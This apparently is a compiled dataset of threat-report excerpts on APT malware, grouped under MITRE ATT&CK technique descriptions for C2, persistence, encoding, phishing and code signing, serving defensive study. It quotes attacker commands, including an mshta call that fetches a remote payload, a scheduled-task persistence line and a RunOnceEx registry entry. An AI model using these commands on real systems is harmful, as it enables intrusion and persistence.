33 Download specified file to %TEMP%\up and execute it in a new process      During C2 communications, BADNEWS will communicate to the C2 previously identified via HTTP
Exfiltrate data using HTTP over HTTP over AES over XOR, or any combination of the available transports
Deep Discovery Inspector protects customers from these threats via this DDI Rule:  DDI Rule 18 : DNS response of a queried malware Command and Control domain DDI Rule 15 : Many unsuccessful logon attempts (nbt_scan.exe) DDI Rule 38 : Multiple unsuccessful logon attempts (nbt_scan.exe)  TippingPoint customers are protected from these threats via these ThreatDV filters:  27218: HTTP: TROJ_RATANKBA_A Checkin 28219: HTTP: TROJ_RATANKBA_A Checkin 02 27220: HTTPS: TROJ_RATANKBA_A Checkin 27221: HTTP: Sundown EK Flash Exploit (SWF_EXPLOYT.YYRQ)  A list of related Indicators of Compromise (IoCs) can be found in this appendix
IcedCoffee is a fairly basic backdoor which uses WMI to collect a variety of system and user information from the system, which is then encoded with base64, encrypted with RC4 and submitted via HTTP POST to the C2 server
It then calls the subfunction with the argument of 2 to get the string that it will use as the HTTP POST request
The resulting HTTP POST request looks like the following: POST http://185.25.50[.]93/syshelp/kd8812u/protocol.php HTTP/1.1 Host: 185.25.50[.]93 Content-Type: application/x-www-form-urlencoded Content-Length: 21 porg=44908AE0524f422d We have not seen a C2 server respond to our requests during our analysis, however, we do know how the Trojan will parse the C2’s response for specific data
We have seen the following HTTP POST parameters within the Zebrocy C++ samples: porg structOne oq volume DDE Details The author of the DDE document used in the February 2018 attacks used some obfuscation techniques in an attempt to evade detection
Victim Registration SpeakUp uses POST and GET requests over HTTP to communicate with its main C&C which is the compromised website of speakupomaha[.]com
It uses the legitimate Naver email platform in order to communicate with the attackers via email
Command & Control  The malware communicates with the Naver email platform in order to communicate with the operator
It communicates with ftp.bytehost31[.]org via FTP for command and control (C2)
Domains  http://mdzz2019.noip[.]cn:19931 http://mdzz2019.noip[.]cn:3654/  From my analyses, I was able to identify http://mdzz2019.noip[.]cn:19931 as its main C2 url.  This is a dynamic DNS, meaning the actual IP changes quite frequently
XAgent uses HTTP requests to communicate with its C2 servers, which allows the threat actor to interact with the compromised system
The Trojan uses HTTP POST requests, as seen in Figure 1 to send data to the C2 server, and GET requests to receive commands from the server, as seen in Figure 2
Figure 1 XAgent macOS HTTP POST request  Figure 2 XAgent mscOS HTTP GET request The C2 URLs generated by XAgentOSX are very similar to those created by its Windows-based counterpart
Figure 3 Hardware ID used by XAgent to uniquely identify compromised hosts When generating the URLs within the HTTP POST and GET requests, XAgent sets one HTTP parameter using a specific data structure that contains this agent_id value
For instance, when using this string we observed DNS queries for “apple-search.infoclose”, as the string “close” was supposed to be the next portion of the C2 URL

it operates over DNS traffic, but can also switch to encrypted channels such as HTTPS or SSL
HAWKBALL is a backdoor that communicates to a single hard-coded C2 server using HTTP
The malware sends an HTTP GET request to its C2 IP address using HTTP over port 443
Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. 
Persistence is maintained through a Run registry key
In the order to run the SSH server, the attackers created a VBS file with the following content: Set WshShell = CreateObject(“WScript.Shell”) WshShell.CurrentDirectory = “C:\WINDOWS\TEMP\Dropbear\” WshShell.Run “dropbear.exe -r rsa -d dss -a -p 6789”, 0, false As is evident here, the SSH server will accept connections on port number 6789
This marker indicates the presence of an encrypted MZ marker in the .hwp file and is decrypted by the malware and written to the Startup folder for the user:  C:\Documents and Settings\<username>\Start Menu\Programs\Startup\viso.exe  This step establishes the persistence of the malware across reboots on the endpoint Once the decrypted MZ marker is written to the Startup folder, the 2.hwp is deleted from the endpoint  The malware might perform this activity for a couple of reasons:  Establish persistence for itself on the endpoint Establish persistence of another component of the malware on the endpoint Update itself on endpoint after a separate updater component downloads the update from the control server  The malware has limited reconnaissance and data-gathering capabilities and is not full-fledged spyware
Finally, the first DLL adds the registry key “SysRat,” at SoftWare\Microsoft\Windows\CurrentVersion\Run, to ensure the malware is executed at startup
The two variants of MPK share the same registry key that the Trojan uses to automatically run each time the system starts, specifically: [HKLM and HKCU]\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\explorer Both MPK variants include key loggers that are extremely similar in functionality in addition to having the same strings used for headers within the key log file
The RunAtLoad key will command launchd to run the daemon when the operating system starts up, while the KeepAlive key will command launchd to let the process run indefinitely
The embedded VBScript is retrieved from a resource and decrypted using the same algorithm as discussed above, which results in the following cleartext:       set objshell = createobject(\"wscript.shell\")objshell.run \"mshta hxxp://86.106.131.177:6500/zIZFh\",vbhide     The Koadic C2 server will respond to this request with Javascript code that acts as the Koadic staging payload, which allows the actor to run additional Koadic modules on the end system to carry out their post-exploitation activities
NavRAT then creates a registry key in order to execute this file copy at the next reboot of the system, an initial method of persistence
Once the user clicks on the fake Adobe Flash Player installer, it will extract/create the following malicious payload into the Startup directory to maintain its persistence:
Register the RUN key in the registry below, so that the VBS file is executed every time the machine starts
A new registry entry is created at HKEY_CURRENT_USERS\Software\Microsoft\Windows\CurrentVersion\Run\Graphics with a value of “C:\ ProgramData \ Initech \Initech.exe” /run.
When each file is encrypted, registry keys are created under HKU\{SID}\Software\Microsoft\ RestartManager \ which are used to track metadata pertaining to the file being encrypted, such as owner, sequence, session and file hash

Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.

Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>. The startup folder path for all users is <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>.

The following run keys are created by default on Windows systems:

* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

Run keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a "Depend" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)

The following Registry keys can be used to set startup folder items for persistence:

* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>

The following Registry keys can control automatic startup of services during boot:

* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:

* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> and <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> subkeys can automatically launch programs.

Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> run when any user logs on.

By default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.

Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.
APT10 spear phishes have been relatively unsophisticated, leveraging .lnk files within archives, files with double extensions (e.g
The .lnk file extracted from the .7zip file
When the .lnk file is initialized, it spawns a CMD process
We have covered recent FIN7 activity in previous public blog posts:   FIN7 Spear Phishing Campaign Targets Personnel Involved in SEC Filings  FIN7 Evolution and the Phishing LNK  To SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for Persistence  The FireEye iSIGHT Intelligence MySIGHT Portal contains additional information on our investigations and observations into FIN7 activity
The .zip archive attached to the email contains a Windows shortcut (.lnk) file with the Microsoft Internet Explorer logo
Clicking on the shortcut ultimately leads to Backdoor.Pirpi being downloaded and executed on the affected computer
Comnie is able to achieve persistence via a .lnk file that is stored within the victim’s startup path
Additionally, in the event Kaspersky is detected, the malware will immediately run the ‘Conime.lnk’ shortcut file in a new process after it is created
The script saves the decoded and decompressed executable to %APPDATA%\Microsoft\Windows\Templates\WindowsTemplate.exe and creates an LNK shortcut at %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OneDrive.lnk to persistently run WindowsTemplate.exe each time Windows starts up
This round of FIN7 phishing lures implements hidden shortcut files (LNK files) to initiate the infection and VBScript functionality launched by mshta.exe to infect the victim
In this ongoing campaign, FIN7 is targeting organizations with spear phishing emails containing either a malicious DOCX or RTF file – two versions of the same LNK file and VBScript technique
This spawns the hidden embedded malicious LNK file in the document
Figure 3: FIN7 phishing lure persistence mechanisms Examining Attacker Shortcut Files In many cases, attacker-created LNK files can reveal valuable information about the attacker’s development environment
These files can be parsed with lnk-parser to extract all contents
LNK files have been valuable during Mandiant incident response investigations as they include volume serial number, NetBIOS name, and MAC address
If this file exists, the content is read in order to obtain a path to find a second file with the LNK (link) extension
The LNK file is finally used to identify a third file: a ZIP file
When it is executed, it creates two files: an LNK file that points to %system32%\rundll32.exe, and the FELIXROOT loader component
The LNK file is moved to the startup directory
This file is then copied to a filename of ‘Windows Update.lnk’, which is placed in the startup path previously identified
This shortcut file points to the path of the previously written ‘Applet.cpl’ file
Finally, Reaver.v1 will execute the ‘~WUpdate.lnk’ file in a new process, thus loading the recently dropped malicious CPL file
This shortcut file points to the path of the previously written ‘winhelp.cpl’ file
Finally, Reaver.v2 will execute the ‘~Update.lnk’ file in a new process, thus loading the recently dropped malicious CPL file
This shortcut file calls the built-in ‘control.exe’ utility to in turn load the previously dropped malicious CPL file of ‘winhelp.cpl’
In this campaign the KopiLuwak backdoor was encoded and delivered in a Windows shortcut (.lnk) file
The lnk files were an especially interesting development because the powershell code they contain for decoding and dropping the payload is nearly identical to that utilized by the Zebrocy threat actor a month earlier
Using Windows Shortcut files (.lnk) in the Startup folder that invoke the Windows Scripting Host (wscript.exe) to execute a Jscript backdoor for persistence
When the Trojan runs as an executable within the “DsvHelper” folder, the Trojan will create a shortcut (.lnk file) and save the shortcut to the ‘DsvHelper’ folder
2 Successful payload download Astaroth’s initial payload is a malicious .lnk file, a common delivery method used by threat actors
Malicious .lnk files contain a link to a URL (instead of the expected local URI) to grab the next payload
In the case of Astaroth trojan, the .lnk file contains an argument into WMIC.exe to run in non-interactive mode, which forgoes opening a window that the victim could notice, to download the hardcoded url in the .lnk
Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.

Adversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.(Citation: Shortcut for Persistence ) Although often used as payloads in an infection chain (e.g. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)), adversaries may also create a new shortcut as a means of indirection, while also abusing [Masquerading](https://attack.mitre.org/techniques/T1036) to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.

Shortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. [Browser Extensions](https://attack.mitre.org/techniques/T1176)) to persistently launch malware.
The tactic also serves to mask malicious C2 and exfiltration traffic and make it appear innocuous
Encoded Payload   Decoded Payload     MD5   Size   Import Hash   Exported Function   Version    aa3f303c3319b14b4829fe2faa5999c1  322164  182ee99b4f0803628c30411b1faa9992  l7MF25T96n45qOGWX  5.3.2    126067d634d94c45084cbe1d9873d895  330804  5f45532f947501cf024d84c36e3a19a1  hJvTJcdAU3mNkuvGGq7L  5.4.1    fce54b4886cac5c61eda1e7605483ca3  345812  c1942a0ca397b627019dace26eca78d8  WcuH  5.4.1    Table 2: Static characteristics of UPPERCUT Another new feature in the latest UPPERCUT sample is that the malware sends an error code in the Cookie header if it fails to receive the HTTP response from the command and control (C2) server
Another difference in the network traffic generated from the malware is that the encoded proxy information has been added in the URL query values during the C2 communication
The communication and exfiltration of data was detected in a real-world scenario using the Cybereason platform
The encoded payload is then made to look like a URI by having a random number of ‘/’ characters inserted at random locations within the encoded payload
McAfee ATR has now discovered additional implants that are part of an operation to gain persistence for continued data exfiltration and for targeted access
The optional HTTP data with king.jpg looks like a beacon to inform the control server that the malware is ready to accept new commands:  Commands received from the control server are encoded DWORDs After decoding, these DWORDs should be in the range 123459h to 123490h  Malware checking to make sure a received command is in the correct range
If the size is 7 bytes or more, the backdoor verifies that the command and control server sent an encoded package
The generated buffer is encoded using the BASE64 alphabet to be sent in the POST request
The DropIt Trojan we analyzed is an executable that builds an embedded executable by decoding embedded blobs of base64 encoded data and concatenating them together in the correct order
It then sends the following IRC commands: NICK bxphzrjbxp USER bxphzrjbxp bxphzrjbxp bxphzrjbxp bxphzrjbxp To make sure it connected to the correct server, the Trojan checks for the message sent from the IRC server after the bot connects: Welcome to the MpkNet IRC Network The MPK bot does not join a specific IRC channel, instead sending private messages (PRIVMSG) to a user with the nick “mpk”
In response to this request, the C2 server responds with a Base64-encoded RSA public key (seen in Figure 12)
Data that is sent is compressed and then base64-encoded before being included in the requests
The C2 server sends back Base64 encoded response
The script gathers system specific data, such as the domain the system belongs to and the current username, that it constructs in the following format:   <domain>\<username>:pass   The above string is encoded using a custom base64 encoder to strip out non-alphanumeric characters (=, / and +) from the data and replaces them with domain safe values (01, 02 and 03 respectively)
A notable characteristic of CopyKittens is the use of DNS for command and control communication (C&C) and for data exfiltration
Note: CTU researchers frequently observe threat actors renaming archiving tools and storing data for exfiltration in uncommon directories
This encoded information then gets an additional header added and sent across the network.
Once the host-based enumeration information was obtained, it was base64-encoded and then appended to the URL post request to a C2, whereas in previous versions this information was written to a text file.
Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.
Attack Overview The attack starts with Microsoft Word documents containing a malicious VBA macro being attached to spear phishing emails
The actor has used several notable techniques in these incidents such as sniffing passwords from Wi-Fi traffic, poisoning the NetBIOS Name Service, and spreading laterally via the EternalBlue exploit.  APT28 Uses Malicious Document to Target Hospitality Industry FireEye has uncovered a malicious document sent in spear phishing emails to multiple companies in the hospitality industry, including hotels in at least seven European countries and one Middle Eastern country in early July
Initial Compromise For initial compromise, FireEye Intelligence has observed APT39 leverage spear phishing emails with malicious attachments and/or hyperlinks typically resulting in a POWBAT infection
Malware Delivery Method  In all emails sent to these government officials, the actor used the same attachment: a malicious Microsoft Word document that exploited the CVE-2012-0158 vulnerability to drop a malicious payload
Figure 1: Contents of the Email A review of the email header data from the spear phishing messages showed that the threat actors sent the emails using the same infrastructure they have used in the past
In at least some of these recent attacks, Buckeye used spear-phishing emails with a malicious .zip attachment
Looking at earlier attacks between 2013 and 2016, we believe Comnie was also used in targeted attacks against the following individuals or organizations:  Taiwan government IT service vendor in Asia Journalist of a Tibetan radio station   Figure 6 Email sent to Journalist of Tibetan radio station   Malicious Macros The malicious macro documents used to deliver Comnie initially hide the content inside and requests that the user enables macros prior to viewing the document
APT32 actors continue to deliver the malicious attachments via spear-phishing emails
The credential harvesting attacks used spear-phishing emails that contained malicious Microsoft Office documents that leveraged the “attachedTemplate” technique to load a template from a remote server
The attack involved a spear-phishing email with a subject of “Project Offer” and a malicious Word document (SHA256: d393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318) as an attachment
Attached to this email was a malicious Microsoft Word document (MD5: f6fafb7c30b1114befc93f39d0698560) that exploited CVE-2012-0158
Like past attacks, the initial infection vector is a malicious Word document attached to a phishing email that is well-tailored to the targeted business and its day-to-day operations
Phishing emails with political themes were used in the majority of the observed attack emails
In order to meet the phishing emails’ infrastructure requirements, disposable domains and emails were used as the delivery medium
Based on our analysis, financial organizations in Turkey were targeted via spear phishing emails containing a malicious Microsoft Word document
Figure 2: Excerpt of an APT33 malicious .hta file We assess APT33 used a built-in phishing module within the publicly available ALFA TEaM Shell (aka ALFASHELL) to send hundreds of spear phishing emails to targeted individuals in 2016
The spear phishing emails and attached malicious macro documents typically have geopolitical themes
The attackers used spear phishing emails combined with malicious HWP documents created using Hancom Hangul Office Suite
We suspect the attacker was trying to generate sympathy by reminding the reader that Munchon and the province it is in, Kangwon, were part of a unified province that included South Korea's Gangwon-do prior to the division of Korea in 1945.A second email contained a story about a person called 'Ewing Kim' who was looking for help:The email's attachments are two different HWP documents, both leveraging same vulnerability (CVE-2013-0808)
This campaign began with a handful of spear phishing emails to South Korean targets and containing malicious attachments
MAGIC HOUND TOOLSET The Magic Hound attacks did not rely on exploit code to compromise targeted systems, instead relying on executables and Microsoft Office documents, specifically Excel and Word documents containing malicious macros
The emails had a malicious Excel macro document attached, which when executed led to a new Microsoft Visual Basic (VB) script-based malware family which we are dubbing “BabyShark”
Another interesting characteristic of the malicious documents is that the metadata associated with the document files themselves also matches that found in many of the malicious documents that were previously being used to spread Remcos.Figure 3: Document metadataAdditionally, the creation and modification dates associated with these documents are shortly after we released a detailed analysis of Remcos distribution campaigns that were being observed throughout 2018
In May 2016, we published a blog detailing a spear phishing campaign targeting banks in the Middle East region that used macro-enabled attachments to distribute POWBAT malware
Analysis APT34 sent a malicious .rtf file (MD5: a0e6933f4e0497269620f44a083b2ed4) as an attachment in a malicious spear phishing email sent to the victim organization
This attack diverged from previous attacks we observed from this group as it involved spear-phishing emails sent to targeted organizations with password protected RAR archive attachments that contained malicious Excel Web Query files (.iqy)
In this instance a spear phishing email was used containing a lure designed to socially engineer and entice the victim to executing a malicious attachment
In contrast to the two samples used in these attacks, this one did not use a PE attachment, and instead used a Microsoft Word document containing a malicious macro as the delivery vehicle
The email contained an attachment named Seminar-Invitation.doc, which is a malicious Microsoft Word document we track as ThreeDollars
Zebrocy is delivered primarily via phishing attacks that contain malicious Microsoft Office documents with macros as well as simple executable file attachments
Malicious Document   Decoy Document  The attack starts with a spear-phishing email containing the HWP document named "미북 정상회담 전망 및 대비.hwp" (Prospects for US-North Korea Summit .hwp)
Initial Attack On December 13, 2017, a spear phishing email was sent from the email address of yuri.sidorav@yandex[.]ru to a high ranking individual within a British government agency
Traps blocks all of the files currently associated with Gorgon Group    Appendix   Analysis of a targeted attack “1971 Liberation War Freedom Fighters in Pakistan ArmyCustody Database98” The delivery documents used in the targeted attacks are Microsoft Office documents that contain a macro that attempts to compromise the system
Delivery TG-3390 conducts SWCs or sends spearphishing emails with ZIP archive attachments
The initial infection vector of this campaign is a Microsoft Office Excel Worksheet with an Office macro that uses the mshta.exe Windows executable to run scripts, which are embedded in the HTML of a specially-crafted blogspot.com page

The case we found arrived through a targeted email that contained a document file (in docx format).
APT32 likely used COVID-19-themed malicious attachments against Chinese speaking targets.
Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.

There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. 
Once the password (delivered in the body of the email) is entered, the users are presented with a document that will request users to enable the malicious macro, as shown in Figure 3
Successful execution of the macro within the malicious document results in the installation of APT28’s signature GAMEFISH malware
Once the user enables macros, the macro will perform the following actions:  Displays decoy content Checks for the existence of a file at %APPDATA%\wscript.exe If %APPDATA%\wscript.exe does not exist, the macro converts an embedded hex-encoded string into bytes and saves this data to the %APPDATA%\wscript.exe
None of the known documents contain a lure image or message to instruct the recipient to click the Enable Content button necessary to run the macro, as seen in Figure 1
The majority of delivery documents contain a generic lure image requesting the victim enable macros with no additional content, the adversaries seemingly relying solely on lure filenames to entice victims to launch the malicious document
The victim will then see a prompt to Enable Content as with any malicious macro document as seen in Figure 5
Figure 5 Remote template document requesting the user to click “Enable Content” to run macro Clustering The delivery documents used in the October and November waves shared a large number of similarities, as seen in Table 1, which allowed us to cluster the activity together
Figure 1: Malicious FIN7 lure asking victim to double click to unlock contents The malicious LNK launches “mshta.exe” with the following arguments passed to it: vbscript:Execute("On Error Resume Next:set w=GetObject(,""Word.Application""):execute w.ActiveDocument.Shapes(2).TextFrame.TextRange.Text:close") The script in the argument combines all the textbox contents in the document and executes them, as seen in Figure 2
Malicious processes are marked red (click image to enlarge):  The following malicious files are dropped and run:  C:\ProgramData\{2ED05C38-D464-4188-BC7F-F6915DE8D764}\OFFLINE\9A189DFE\C7B7C186\main.vbs dcac79d7dc4365c6d742a49244e81fd0 C:\Users\Public\Libraries\RecordedTV\DnE.ps1 7fe0cb5edc11861bc4313a6b04aeedb2 C:\Users\Public\Libraries\RecordedTV\DnS.ps1 3920c11797ed7d489ca2a40201c66dd4 “C:\Windows\System32\schtasks.exe” /create /F /sc minute /mo 3 /tn “GoogleUpdateTasksMachineUI” /tr C:\Users\Public\Libraries\RecordedTV\backup.vbs 7528c387f853d96420cf7e20f2ad1d32  Command and control server is located in the following domain: tecsupport[.]in A detailed analysis of the malware is provided in two posts by Palo Alto networks and in a post by FireEye, which wrote about previous campaigns by this threat agent
This document was a decoy aimed to entice the user to open malicious documents embedded further down the pageThe actor embedded two additional links and the document urged the user to click on these links for more information about New Year's activities in North Korea
These documents contained malicious OLE objects used to drop binaries.This time, however, they contained malicious OLE (Object Link Embedded) objects.Initial analysis confirmed two similarly sized OLE object files within this document which appeared to be the same from an execution point of view.The two dropped binaries were stored and executed in this location during our analysis:C:\Users\ADMINI~1\AppData\Local\Temp\Hwp (2).exeC:\Users\ADMINI~1\AppData\Local\Temp\Hwp (3).exeInitial analysis showed some sloppy cleaning up from Group123, which we used later to determine that separate campaigns were the work of this same actor, as compilation artifacts remained within the binaries:e:\Happy\Work\Source\version 12\T+M\Result\DocPrint.pdbThe second stage of the dropped binaries was used to execute wscript.exe while injecting shellcode into this process
Email attacks often use “click-worthy” or interesting topics to convince users to click links or open attachments that could lead to various threats
Users are advised to avoid opening attachments and click links on unsolicited emails
In one example, the Word document contained a button with the label “First click “Enable Content” above the page, then click here to fill out the form”  This string attempts to trick the user into enabling macros to execute the malicious code within the macro
These Honeybee documents did not contain any specific lures, rather variations of a “not compatible” message attempting to convince the user to enable content
Additionally, a small number of campaigns over this same period also made use of various file-sharing platforms like Dropbox for hosting the malicious documents rather than directly attaching them to the messages themselves.Figure 2: Example malicious Excel documentSimilar to the technique described in our previous blog about Remcos, the contents of the documents have been intentionally made to appear as if they are blurry, with the user being prompted to enable editing to have a clearer view of the contents
By default, Excel does not allow the download of data from the remote server, but will ask for the user’s consent by presenting the dialog box in Figure 2:  Figure 2 Excel security notice for .iqy files By enabling this data connection, the user allows Excel to obtain content from the URL in the .iqy file
The document also contained a lure image, similar to ones commonly found in malicious macro documents which ask the user to click on “Enable Content” as seen in Figure 2
Malicious Macro Analysis When the victim opens the ThreeDollars document they are presented with the lure image and prompted to click on the “Enable Content” button
Message 3:    Headers Received: by mailcenter.support   Sender Mercator Institute for China Studies <publications@mericcs.org>   Subject Authoritarian advance Responding to Chinas growing political influence in Europe   Body Content and images included within the e-mail body were a direct copy of the following MERICS report:  https://www.merics.org/sites/default/files/2018-02/GPPi_MERICS_Authoritarian_Advance_2018_1.pdf   Notes The hyperlinked text Click here to download the report within the e-mail body lead to a malicious RTF document located at the URL hxxp://www.mericcs.org/GPPi_MERICS_Authoritarian_Advance_2018_1Q.doc
Cluster A Case 1: Delivery via document property macro – a789a282e0d65a050cccae66c56632245af1c8a589ace2ca5ca79572289fd483  In our research we found at least one attack against a company leveraging a Microsoft Office Excel document with an embedded macro to launch the malware
By doing so, the main content of the macro itself (Figure 2) can be kept relatively simple, and the malicious’ codes small footprint can help enable evasion of automated detection mechanisms based on macro content

In March, we came across an email with a malware attachment that used the Gamaredon group’s tactics.

Whitefly first infects its victims using a dropper in the form of a malicious .exe or .dll file that is disguised as a document or image.

Once a user has double-clicked the embedded image, the form executes a VB setup script
The threat actors also took additional steps to replace some variable strings in the more recent samples, likely in an attempt to avoid signature-based detection from Yara rules. Once the document was opened, it prompted the user to enable the macro titled "BlackWater.bas".
An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).

While [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).

Adversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary, or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204). For example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)
The version used here is version 4.1 digitally signed by Notepad++, as shown in Figure 5
By using this technique, the malware is able to leverage itself from a signed and verified legitimate Windows OS process, or, alternatively, if aswrundll.exe or unins000.exe exists, a signed and verified security product process
FIN7 has consistently utilized legally purchased code signing certificates to sign their CARBANAK payloads
In these websites they hosted malware that was digitally signed with a valid, likely stolen code signing certificate Based on VirusTotal uploads, malicious documents content, and known victims – other targeted organisations are located in Turkey, Qatar, Kuwait, United Arab Emirates, Saudi Arabia, and Lebanon
Digitally signed malware The entire bundle (VPN client and malware) was digitally signed with a valid code signing certificate issued by Symantec to AI Squared, a legitimate software company that develops accessibility software:  Thumbprint: F340C0D841F9D99DBC289151C13391000366631C Serial number: 45 E4 7F 56 0B 01 B6 4E 68 39 5E 5D 79 2F 2E 09 Another Helminth sample, 1c23b3f11f933d98febfd5a92eb5c715, was signed with a different AI Squared code signing certificate: Thumbprint: 92B8C0872BACDC226B9CE4D783D5CCAD61C6158A Serial number:62 E0 44 E7 37 24 61 2D 79 4B 93 AF 97 46 13 48 This suggest that the attackers had got a hold of an Ai Squared signing key, potentially after compromising their network
The file, named Microsoft.Win32.TaskScheduler.dll, is digitally signed by a certificate from AirVPN
The DLL is also digitally signed by a certificate from “AirVPN”
They combine reconnaissance of GPO (Group Policy Object management for execution) with digitally-signed malware to avoid detection or blocking during their infection phases
Stolen code signing certificates used to sign malware
Many of this APT’s components are signed with phony Intel and AMD digital certificates
Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) The certificates used during an operation may be created, acquired, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Unlike [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), this activity will result in a valid signature.

